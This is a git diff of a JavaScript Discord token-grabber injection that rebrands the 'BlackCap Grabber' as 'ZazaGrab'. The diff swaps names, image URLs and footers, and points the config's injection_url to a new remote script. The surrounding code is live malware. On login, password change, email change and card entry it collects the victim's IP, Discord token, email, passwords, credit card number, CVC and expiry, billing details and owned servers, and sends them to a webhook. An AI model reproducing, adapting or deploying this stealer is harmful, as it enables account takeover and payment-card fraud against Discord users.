@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/xKrustyDemonx/zaza-inject/main/index.js",
     webhook: "%WEBHOOK%",
     apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
     filter2: {
@@ -269,11 +269,11 @@ async function FirstTime() {
                         ip
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     const c = {
-                        username: "BlackCap Grabber",
-                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                        username: "ZazaGrab Grabber",
+                        avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/zazagrab(2).jpg",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
+                            title: "ZazaGrab Initalized",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -281,10 +281,10 @@ async function FirstTime() {
                                 inline: !1
 							}],
                             author: {
-                                name: "BlackCap"
+                                name: "ZazaGrab"
                             },
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "Sole's | https://github.com/xKrustyDemonx"
                             }
 						}]
                     };
@@ -300,18 +300,18 @@ async function FirstTime() {
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     
                     if(b.avatar === null){
-                        usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                        usericonurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/image.jpg"
                     }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                     if(b.banner === null){
-                        bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                        bannerurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/frame_4_delay-0.16s-removebg-preview.jpg"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "BlackCap Grabber",
-                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                        username: "ZazaGrab Grabber",
+                        avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/image.jpg",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
-                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                            title: "ZazaGrab Initalized",
+                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have ZazaGrabed someone**](https://github.com/xKrustyDemonx)",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -343,7 +343,7 @@ async function FirstTime() {
                                 inline: !0
 								}, {
                                 name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
                                 inline: !0
 								}, {
                                 name: "<a:tokens:1041634540537511957> Token",
@@ -352,7 +352,7 @@ async function FirstTime() {
 								}],
 
                             footer: {
-                                text: "�KSCH | https://github.com/KSCHdsc"
+                                text: "Sole's | https://github.com/xKrustyDemonx"
                             },
                             image: {
                                 url: bannerurl,
@@ -384,11 +384,11 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             const c = {
-                                username: "BlackCap Grabber",
-                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                                username: "ZazaGrab Grabber",
+                                avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/image.jpg",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCaped User log out (User not Logged in before)",
+                                    title: "ZazaGrabed User log out (User not Logged in before)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -396,10 +396,10 @@ async function FirstTime() {
                                         inline: !1
 							}],
                                     author: {
-                                        name: "BlackCap"
+                                        name: "ZazaGrab"
                                     },
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "Sole's | https://github.com/xKrustyDemonx"
                                     }
 						}]
                             };
@@ -415,18 +415,18 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             if(b.avatar === null){
-                                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                                usericonurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/zazagrab%20-%20injection.jpg"
                             }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                             if(b.banner === null){
-                                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                                bannerurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/zazagrab(2).jpg"
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
-                                username: "BlackCap Grabber",
-                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                                username: "ZazaGrab Grabber",
+                                avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/580b57fcd9996e24bc43c3de.png",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCap Victim got logged out",
-                                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                                    title: "ZazaGrab Victim got logged out",
+                                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have ZazaGrabed someone**](https://github.com/xKrustyDemonx)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -454,7 +454,7 @@ async function FirstTime() {
                                         inline: !0
 								}, {
                                         name: "@Copyright",
-                                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
                                         inline: !0
 								}, {
                                         name: "<a:tokens:1041634540537511957> Token",
@@ -463,7 +463,7 @@ async function FirstTime() {
 								}],
 
                                     footer: {
-                                        text: "�KSCH | https://github.com/KSCHdsc"
+                                        text: "Sole's | https://github.com/xKrustyDemonx"
                                     },
                                     image: {
                                         url: bannerurl,
@@ -835,19 +835,19 @@ async function Login(email, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                usericonurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/frame_4_delay-0.16s-removebg-preview.jpg"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                bannerurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/580b57fcd9996e24bc43c3de.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
-                username: "BlackCap Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                username: "ZazaGrab Grabber",
+                avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/image.jpg",
                 content: "",
                 embeds: [{
-                    "title": "BlackCap User Login",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    "title": "ZazaGrab User Login",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have ZazaGrabed someone**](https://github.com/xKrustyDemonx)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -883,7 +883,7 @@ async function Login(email, password, token) {
                         inline: !0
 												}, {
                         name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        value: `[ZazaGrab 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
                         inline: !0
 												}, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -904,7 +904,7 @@ async function Login(email, password, token) {
 												}, ],
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Sole's | https://github.com/xKrustyDemonx"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
@@ -915,7 +915,7 @@ async function Login(email, password, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Sole's | https://github.com/xKrustyDemonx"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -1001,14 +1001,14 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 }
                 return billing
             }
-            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
+            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg";
             const params = {
-                username: "BlackCap Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                username: "ZazaGrab Grabber",
+                avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/zazagrab%20-%20injection.jpg",
                 content: "",
                 embeds: [{
-                    "title": "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    "title": "ZazaGrab Detect Password Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have ZazaGrabed someone**](https://github.com/xKrustyDemonx)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -1044,7 +1044,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         inline: !0
 												}, {
                         name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        value: `[ZazaGrab 2023 <a:blackcapgif:1041634542093619260>](https://github.com/xKrustyDemonx)`,
                         inline: !0
 												}, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -1080,7 +1080,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Sole's | https://github.com/xKrustyDemonx"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -1163,21 +1163,21 @@ async function ChangeEmail(newemail, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                usericonurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/zazagrab(2).jpg"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                bannerurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/580b57fcd9996e24bc43c3de.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
 
             
            const params = {
-                username: "BlackCap Grabber",
-                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+                username: "ZazaGrab Grabber",
+                avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/image.jpg",
                 content: "",
                 embeds: [{
-                        "title": "BlackCap Detect Email Changed",
-                        description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                        "title": "ZazaGrab Detect Email Changed",
+                        description: "[<a:blackcapgif:1041634542093619260>  **Oh you have ZazaGrabed someone**](https://github.com/xKrustyDemonx)",
                         "color": config['embed-color'],
                         "fields": [{
                                 name: "Injection Info",
@@ -1235,7 +1235,7 @@ async function ChangeEmail(newemail, password, token) {
 				],
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "Sole's | https://github.com/xKrustyDemonx"
                         },
                         "thumbnail": {
                             "url": `${usericonurl}`
@@ -1246,7 +1246,7 @@ async function ChangeEmail(newemail, password, token) {
                         "description": CalcFriends(),
 
                         "footer": {
-                            "text": "�KSCH | https://github.com/KSCHdsc"
+                            "text": "Sole's | https://github.com/xKrustyDemonx"
                         },
                         "image": {
                             'url': `${bannerurl}`,
@@ -1275,19 +1275,19 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ip
     } = await getFromURL("https://www.myexternalip.com/json", null)
         if(info.avatar === null){
-            usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+            usericonurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/zazagrab%20-%20injection.jpg"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
         if(info.banner === null){
-            bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+            bannerurl = "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/image.jpg"
         }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
         
         const params = {
-            username: "BlackCap Grabber",
-            avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+            username: "ZazaGrab Grabber",
+            avatar_url: "https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/580b57fcd9996e24bc43c3de.png",
             content: "",
             embeds: [{
-                    "title": "BlackCap User Credit Card Added",
+                    "title": "ZazaGrab User Credit Card Added",
                     "description": `
                     **IP:** ${ip}\n\n
                     **Username** <:username:1041634536733290596>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
@@ -1303,10 +1303,10 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     **CVC**\n\`\`\`${cvc}\`\`\`\n
                     <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
                     "author": {
-                        "name": "BlackCap"
+                        "name": "ZazaGrab"
                     },
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Sole's | https://github.com/xKrustyDemonx"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
@@ -1315,10 +1315,10 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                 {
                     "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
                     "color": config['embed-color'],
-                    "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
+                    "description": `\`\`\`diff\n${fs.readFileSync('zazagrabed_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
 
                     "footer": {
-                        "text": "�KSCH | https://github.com/KSCHdsc"
+                        "text": "Sole's | https://github.com/xKrustyDemonx"
                     },
                     "image": {
                         'url': `${bannerurl}`,
